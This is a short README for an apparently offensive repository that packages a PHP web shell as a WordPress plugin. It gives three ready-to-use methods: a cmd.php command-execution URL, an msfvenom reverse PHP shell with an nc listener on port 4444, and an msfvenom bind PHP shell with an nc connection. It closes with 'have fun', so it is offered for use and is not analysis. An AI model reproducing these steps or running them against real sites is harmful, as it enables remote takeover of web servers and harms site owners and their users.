# wordpress-reverse-bind-shell

Update the current php files (and ip address ¬¬), and then create a zip file with whole folder. Install as plugin in wordpress, and have fun...

## 1st option
http://172.16.1.8/wordpress/wp-content/plugins/wordpress-reverse-bind-shell/cmd.php?cmd=whoami

## 2nd option
msfvenom -p php/reverse_php -f raw  LHOST=172.16.1.1 LPORT=4444 -o reverse.php

nc -lvnp 4444

## 3rd option
msfvenom -p php/bind_php -f raw LPORT=4444 -o bind.php

nc 172.16.1.8 4444



## ToDo
More details...
